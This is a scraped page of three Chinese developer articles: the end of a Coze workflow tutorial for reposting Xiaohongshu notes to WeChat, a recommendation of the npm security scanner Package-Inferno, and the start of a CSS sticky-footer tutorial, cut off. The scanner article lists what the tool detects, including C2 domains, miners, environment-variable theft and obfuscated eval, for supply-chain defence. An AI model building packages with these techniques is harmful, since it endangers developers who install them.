<p>PS：本工作流提示词较多，文章篇幅原因，系统提示词我统一放于文末。</p>
<h3 data-id="heading-10">2.9. 配图二创</h3>
<p>这个节点使用到了扣子官方的图像生成节点，用来对小红书配图进行二创。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c4652e12f414d7f83af6365f01432f9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=kDhVUJ1klWYigghw1%2FATW5ooPfc%3D" alt="" loading="lazy"/></p>
<p>PS：本工作流提示词较多，文章篇幅原因，提示词我统一放于文末。</p>
<h3 data-id="heading-11">2.10. 获取微信公众号接口凭证</h3>
<p>这个节点使用到了扣子的三方插件【微信公众号接口】的【get_access_token】工具，用于获取接口调用凭证。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce16aa8108f147d4bd47f458061c7ce6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=KmJvAbTKr930sCyChWkDr%2Bt1qRA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-12">2.11. 配图批量上传小绿书</h3>
<p>这个节点使用到了扣子官方的批处理节点。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/54761444896446a79dd773f2af400402~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=pzgGdzGGfW36IdijJ2zPqZpvM8s%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-13">2.12. 上传图片到小绿书</h3>
<p>这个节点使用到了扣子三方插件【微信公众号接口】的【wx_upload_image】工具，用于把二创后的配图上传到小绿书中。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1cf8545122df42da98ac900dca35d3d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=GtWpYeqBgo2AqWfvXslvdrgytSo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-14">2.13. 图片转成小绿书格式</h3>
<p>这个节点用来把上传图片拿到的结果转成小绿书图片的格式，使用到了三方插件【微信公众号工具箱】的【np_media_id_convert_to_obj】工具。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c22cd72ecde3461cb5edbe6a6a1fb6ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=ZuAJJfyTSQBv5t9OCsuikO5v84Y%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-15">2.14. 图片列表信息转成小绿书草稿格式</h3>
<p>这个节点用于将上传到小绿书后的图片的列表转成添加草稿时需要的格式，使用到了扣子三方插件【微信公众号工具箱】的【np_image_obj_list_2_obj】工具。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be11d9268e0849d59acc650d9321c81a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=mxLfH%2BO3wyA7VCrHFoExZjNUMiA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-16">2.15. 添加小绿书草稿</h3>
<p>这个节点用来生成小绿书的草稿，使用到了扣子三方插件【微信公众号接口】的【add_newspic_draft】工具。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30d520974e2844b7b9a9dbac17b47776~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=eY4yk4UGgpDei4H99rUN%2BxOOqEA%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-17">2.16. 结束</h3>
<p>结束节点，media_id有值说明添加到小绿书草稿成功，note_title、note_content、note_images这些信息，如果你需要发小红书的话，可以拷贝这些信息去发送。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bece877f380347d4909e4c6b90e8ed00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=4K%2FmIn5m%2FXLDsWJOEFdz4ILIdpw%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-18">3. 总结</h2>
<p>本文详细地介绍了如何对小红书笔记进行二创，并且实现了一键发布到小绿书，文中对整个扣子工作流做了拆解，这个工作流使用到了较多大模型来对数据进行处理，因此需要编写较多的提示词。</p>
<p>本工作流使用到的提示词较多，受限于文章篇幅，没有列出，吾鳴已经把所有提示词打好包，需要的朋友可以文章三连后，评论区留言“红到绿”，并且后台私信“红到绿”获取。</p>
<p>本文的分享就到这里，如果您觉得有收获的话，可以给个一键三连，您的鼓励是吾鳴持续输出的最大动力。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a185b21cb70424b8c66ef79eb696d2d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZC-6bO0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768881421&amp;x-signature=2ukiEbJTVhtirAgQBQjvzUpd9BU%3D" alt="" loading="lazy"/></p>
<p>最近实战了一些扣子（Coze）工作流相关的案例，包含小红薯图文生成、爆款视频剪辑、办公提效等扣子案例，内附详细的教程和工作流安装包，感兴趣的朋友可以来个<strong>一键三连（必须动作）</strong> ，文章评论区评论“<strong>扣子案例</strong>”领取（这些案例不包含本文分享的案例，如果需要本文分享的案例安装包可以后台私信我）。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【开源项目推荐】Package-Inferno：一个让你看透 npm 包“真面目”的开源神器]]></title>    <link>https://juejin.cn/post/7594303923362103336</link>    <guid>https://juejin.cn/post/7594303923362103336</guid>    <pubDate>2026-01-13T02:03:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594303923362103336" data-draft-id="7594303825014259727" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【开源项目推荐】Package-Inferno：一个让你看透 npm 包“真面目”的开源神器"/> <meta itemprop="keywords" content="前端,GitHub"/> <meta itemprop="datePublished" content="2026-01-13T02:03:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端小小栈"/> <meta itemprop="url" content="https://juejin.cn/user/1081575170131006"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【开源项目推荐】Package-Inferno：一个让你看透 npm 包“真面目”的开源神器
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1081575170131006/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端小小栈
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:03:59.000Z" title="Tue Jan 13 2026 02:03:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025～2026 年这段时间，npm 供应链攻击事件仍然层出不穷。</p>
<p>有人一个月偷偷往一个已经被几万人依赖的包里塞后门，有人把恶意代码藏在 prototype pollution 里，有人直接把 crypto miner 伪装成性能优化工具……<br/>
普通开发者面对几百上千个依赖时，真的很难判断一个包到底安不安全。</p>
<p>而今天要介绍的这个工具，就是专门来解决这个痛点的——<br/>
<strong>Package Inferno</strong><br/>
<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMHaggis%2FPackage-Inferno" target="_blank" title="https://github.com/MHaggis/Package-Inferno" ref="nofollow noopener noreferrer">github.com/MHaggis/Pac…</a></p>
<h3 data-id="heading-0">它到底能干什么？</h3>
<p>一句话总结：<br/>
<strong>它能把一个 npm 包“解剖”得非常透彻，比你肉眼看代码、看 package.json、看最近提交记录要深入得多。</strong></p>
<p>目前主要提供的核心能力有这些：</p>



























































<table><thead><tr><th>检测维度</th><th>能发现什么问题</th><th>难度（人工）</th><th>Package Inferno 是否能较好识别</th></tr></thead><tbody><tr><td>可疑字符串/硬编码</td><td>API key、wallet address、C2 域名、矿池地址等</td><td>★★☆</td><td>非常强</td></tr><tr><td>动态代码执行</td><td>eval、Function、vm.runInNewContext 等高危写法</td><td>★★★</td><td>强</td></tr><tr><td>原型污染</td><td>Object.prototype 相关操作</td><td>★★★★</td><td>中等～强</td></tr><tr><td>进程/文件系统操作</td><td>child_process、fs.writeFile、process.exit 等</td><td>★★</td><td>非常强</td></tr><tr><td>网络外联</td><td>http/https/fetch + 可疑域名</td><td>★★</td><td>非常强</td></tr><tr><td>环境变量窃取</td><td>process.env 相关操作 + 敏感关键字</td><td>★★★</td><td>强</td></tr><tr><td>伪装/混淆</td><td>变量名极长、base64 大段字符串、unicode 混淆等</td><td>★★★★</td><td>中等（依赖规则质量）</td></tr><tr><td>版本间行为剧变</td><td>某个版本突然多了很多奇怪代码</td><td>★★★★</td><td>支持（需配合历史版本对比）</td></tr></tbody></table>
<h3 data-id="heading-1">它是怎么做到的？</h3>
<p>Package Inferno 的工作流程大概是这样的：</p>
<ol>
<li>输入 → npm 包名 + 版本（或直接给 tarball url）</li>
<li>自动下载 → 解压 tarball</li>
<li>多维度扫描（目前主要有三类）：
<ul>
<li>基于正则 + 启发式的字符串匹配（最快）</li>
<li>YARA 规则引擎（最强可扩展）</li>
<li>部分 AST 分析（正在快速迭代中）</li>
</ul>
</li>
<li>输出结构化的 JSON 结果，包含：
<ul>
<li>发现的每一个“红旗”（red flag）</li>
<li>对应的文件路径 + 行号 + 命中规则</li>
<li>严重性评分（可自定义）</li>
<li>证据片段（方便人工复核）</li>
</ul>
</li>
</ol>
<h3 data-id="heading-2">实际使用场景举例</h3>
<p>场景1：新项目要引入一个冷门包<br/>
<code>npx package-inferno lodash.debounce@4.0.8</code><br/>
→ 几秒钟告诉你这个版本有没有被投毒</p>
<p>场景2：公司内部供应链安全周<br/>
把所有生产依赖扫一遍，输出 top 20 最可疑的包<br/>
→ 直接生成报告发给安全团队</p>
<p>场景3：研究型玩家<br/>
想研究最近一年有哪些包被投过毒？<br/>
配合脚本批量拉取热门包的不同历史版本 → 对比 delta → 找规律</p>
<h3 data-id="heading-3">目前的状态（2026年1月）</h3>
<ul>
<li>项目非常新（公开时间 ≈ 2025年底～2026年初）</li>
<li>还在快速迭代中，规则还在疯狂补充</li>
<li>作者很活跃，issue 和 PR 响应很快</li>
<li>已经可以开箱即用（支持 Docker 一键跑）</li>
<li>社区贡献度还很低，正是<strong>现在参与最有影响力</strong>的时候</li>
</ul>
<h3 data-id="heading-4">怎么快速上手？（最简单方式）</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 方式1：直接 npx（最快）</span>
npx package-inferno express@4.19.2

<span class="hljs-comment"># 方式2：Docker（推荐批量/公司用）</span>
docker run -it --<span class="hljs-built_in">rm</span> ghcr.io/mhaggis/package-inferno:latest axios@1.7.7

<span class="hljs-comment"># 方式3：本地开发/改规则</span>
git <span class="hljs-built_in">clone</span> https://github.com/MHaggis/Package-Inferno.git
<span class="hljs-built_in">cd</span> Package-Inferno
npm install
npm run scan -- axios@1.7.7
</code></pre>
<h3 data-id="heading-5">一句话总结</h3>
<p>如果你：</p>
<ul>
<li>经常选包选到焦虑</li>
<li>公司有供应链安全要求</li>
<li>对 npm 恶意包投毒原理感兴趣</li>
</ul>
<p>那么 <strong>Package Inferno</strong> 非常值得你今天就 star + clone 一份，闲暇时跑跑自己项目里的依赖，看看能不能挖出一些“惊喜”。</p>
<p>安全，从审视每一个依赖开始。<br/>
祝大家 2026 年都能用上干净的 npm 包～</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端布局笔记：Sticky Footer (粘性页脚) 完美解决方案]]></title>    <link>https://juejin.cn/post/7594322573453328427</link>    <guid>https://juejin.cn/post/7594322573453328427</guid>    <pubDate>2026-01-13T02:20:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594322573453328427" data-draft-id="7594302398687084598" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端布局笔记：Sticky Footer (粘性页脚) 完美解决方案"/> <meta itemprop="keywords" content="前端,CSS"/> <meta itemprop="datePublished" content="2026-01-13T02:20:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="独守一隅"/> <meta itemprop="url" content="https://juejin.cn/user/2963939079500248"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端布局笔记：Sticky Footer (粘性页脚) 完美解决方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2963939079500248/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    独守一隅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T02:20:10.000Z" title="Tue Jan 13 2026 02:20:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">1. 现象描述 (The Problem)</h3>
<p>在开发 H5 或 Web 页面时，经常遇到以下两种尴尬场景：</p>
<ul>
<li><strong>场景 A（内容过短）</strong> ：当页面内容（Content）很少，不足以撑满屏幕高度时，Footer 会“浮”在屏幕中间，底部留出一大片难看的空白。</li>
</ul>

<ul>
<li><strong>场景 B（内容过长）</strong> ：当页面内容很多时，Footer 应该被推到页面最底部，需要滚动到底部才能看到。</li>
</ul>
<p>我们需要的效果是：</p>
<p>无论内容长短，Footer 永远在视口的最底部，或者内容的下方（如果内容超出一屏）。 这就是 Sticky Footer。</p>
<h3 data-id="heading-1">2. 原理解析 (The Principle)</h3>
<p>在 Flexbox 普及之前，我们通常用负 margin 或绝对定位（ position: absolute ）来 hack，但兼容性差且容易覆盖内容。</p>
<p>现在最现代、最优雅的方案是使用 <strong>Flexbox 布局</strong>。</p>
<h4 data-id="heading-2">核心三步走：</h4>
<ol>
<li><strong>容器定高</strong>：将最外层容器（Wrapper）设置为 Flex 容器，方向为列（Column），并强制最小高度为视口高度（ min-height: 100vh ）。这保证了页面至少有一屏高。</li>
</ol>

<ol start="2">
<li><strong>弹性布局</strong>：设置  display: flex; flex-direction: column; 。</li>
</ol>

<ol start="3">
<li><strong>撑开剩余空间</strong>：</li>
</ol>
<ul>
<li><strong>方法一（推荐）</strong> ：给中间的<strong>内容区域</strong>（Content）设置  flex: 1 。这表示“自动占据剩余的所有空间”。当内容短时，它会自动伸长把 Footer 顶到底部；当内容长时，它按实际高度渲染。</li>
</ul>

<ul>
<li><strong>方法二（我们在代码中用的）</strong> ：给 <strong>Footer</strong> 设置  margin-top: auto 。在 Flex 容器中，自动边距会吸收剩余空间，把元素推到另一端。</li>
</ul>
<h3 data-id="heading-3">3. 代码实战 Demo (The Solution)</h3>
<p>这是一个最小化的 HTML/CSS 演示，您可以复制保存为  .html  文件直接运行查看效果。</p>
<p>HTML</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Sticky Footer Demo<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        <span class="hljs-comment">/* 1. 全局重置，防止默认边距干扰 */</span>
        <span class="hljs-selector-tag">body</span> { <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>; <span class="hljs-attribute">font-family</span>: sans-serif; }


        <span class="hljs-comment">/* === [核心布局代码 Start] === */</span>
        
        <span class="hljs-comment">/* 容器：设为 Flex 列布局，且至少占满一屏 */</span>
        <span class="hljs-selector-class">.app-container</span> {
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">flex-direction</span>: column;
            <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>; 
        }


        <span class="hljs-comment">/* 顶部 Header */</span>
        <span class="hljs-selector-tag">header</span> {
            <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#333</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#fff</span>;
